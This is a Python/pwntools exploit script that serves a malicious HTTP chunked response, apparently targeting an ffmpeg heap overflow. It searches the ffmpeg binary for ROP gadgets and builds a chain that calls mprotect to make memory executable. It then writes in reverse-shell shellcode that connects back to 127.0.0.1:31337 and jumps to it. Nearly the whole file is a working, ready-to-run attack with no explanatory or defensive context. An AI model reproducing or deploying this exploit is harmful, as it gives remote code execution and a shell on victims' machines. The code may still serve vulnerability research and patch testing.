#!/usr/bin/python

import os  
import sys  
import socket  
import pdb
from time import sleep  
from pwn import *

bind_ip = '0.0.0.0'  
bind_port = 12345

headers = """HTTP/1.1 200 OK  
Server: HTTPd/0.9  
Date: Sun, 10 Apr 2005 20:26:47 GMT  
Content-Type: text/html  
Transfer-Encoding: chunked

"""


elf = ELF('./ffmpeg')  
shellcode_location = 0x1b28000 # require writeable -> data or bss segment...  
page_size = 0x1000  
rwx_mode = 7

gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))  
pop_rdi = gadget('pop rdi; ret')  
log.info("pop_rdi:%#x" % pop_rdi)  
pop_rsi = gadget('pop rsi; ret')  
log.info("pop_rsi:%#x" % pop_rsi)  
pop_rax = gadget('pop rax; ret')  
log.info("pop_rax:%#x" % pop_rax)  
pop_rcx = gadget('pop rcx; ret')  
log.info("pop_rcx:%#x" % pop_rcx)  
pop_rdx = gadget('pop rdx; ret')  
log.info("pop_rdx:%#x" % pop_rdx)  
pop_rbp = gadget('pop rbp; ret')  
log.info("pop_rbp:%#x" % pop_rbp)  
push_rbx = gadget('push rbx; jmp rdi')  
log.info("push_rbx:%#x" % push_rbx)  
pop_rsp = gadget('pop rsp; ret')  
log.info("pop_rsp:%#x" % pop_rsp)  
add_rsp = gadget('add rsp, 0x58; ret')
log.info("add_rsp:%#x" % add_rsp)
mov_gadget = gadget('mov qword ptr [rcx], rax ; ret')  
log.info("mov_gadget:%#x" % mov_gadget)  
mprotect_func = elf.plt['mprotect']  
log.info("mprotect_func:%#x" % mprotect_func)  
read_func = elf.plt['read']  
log.info("read_func:%#x" % read_func)

def handle_request(client_socket):  
    request = client_socket.recv(2048)
    print request

    payload = ''
    payload += 'C' * (0x8060)
    #payload += p64(0x004a84d9) # rop starts here -> add rsp, 0x58 ; ret
    #payload += p64(0x00496229) # rop starts here -> add rsp, 0x58 ; ret
    payload += p64(add_rsp) # rop starts here -> add rsp, 0x58 ; ret
    payload += 'CCCCCCCC' * 4

    payload += p64(pop_rsp) # rdi -> pop rsp ; ret
    #payload += p64(0x011eba15) # call *%rax -> push rbx ; jmp rdi
    #payload += p64(0x0136f7f2) # call *%rax -> push rbx ; jmp rdi
    payload += p64(push_rbx) # call *%rax -> push rbx ; jmp rdi
    payload += 'BBBBBBBB' * 3
    payload += 'AAAA'
    payload += p32(0)
    payload += 'AAAAAAAA'
    #payload += p64(0x00496229) # second add_esp rop to jump to uncorrupted chunk -> add rsp, 0x58 ; ret
    payload += p64(add_rsp) # second add_esp rop to jump to uncorrupted chunk -> add rsp, 0x58 ; ret
    payload += 'XXXXXXXX' * 11

    # real rop payload starts here
    #
    # using mprotect to create executable area
    payload += p64(pop_rdi)
    payload += p64(shellcode_location)
    payload += p64(pop_rsi)
    payload += p64(page_size)
    payload += p64(pop_rdx)
    payload += p64(rwx_mode)
    payload += p64(mprotect_func)

    # backconnect shellcode x86_64: 127.0.0.1:31337
    shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
    # shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
    shellcode = '\x90' * (8 - (len(shellcode) % 8)) + shellcode
    shellslices = map(''.join, zip(*[iter(shellcode)]*8))

    write_location = shellcode_location - 8
    for shellslice in shellslices:
        payload += p64(pop_rax)
        payload += shellslice
        payload += p64(pop_rcx)
        payload += p64(write_location)
        payload += p64(mov_gadget)

        write_location += 8

    payload += p64(pop_rbp)
    payload += p64(4)
    payload += p64(shellcode_location)
    
    #f = open('cording.txt', 'wb')
    #LOGGER_PROMPT = b"$LOGGER$"
    client_socket.send(headers)
    #f.write(LOGGER_PROMPT+b'\x00')
    #f.write(bytes(headers))
    
    client_socket.send('-1\n')
    #f.write(LOGGER_PROMPT+b'\x00')
    #f.write(b'-1\n')
    sleep(5)
    client_socket.send(payload)
    #f.write(LOGGER_PROMPT+b'\x00')
    #f.write(bytes(payload))
    client_socket.close()
    #f.close()


if __name__ == '__main__':  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((bind_ip, bind_port))
    s.listen(5)

    filename = os.path.basename(__file__)
    st = os.stat(filename)

    while True:
        client_socket, addr = s.accept()
        print(client_socket)
        handle_request(client_socket)
        if os.stat(filename) != st:
            print 'restarted'
            sys.exit(0)
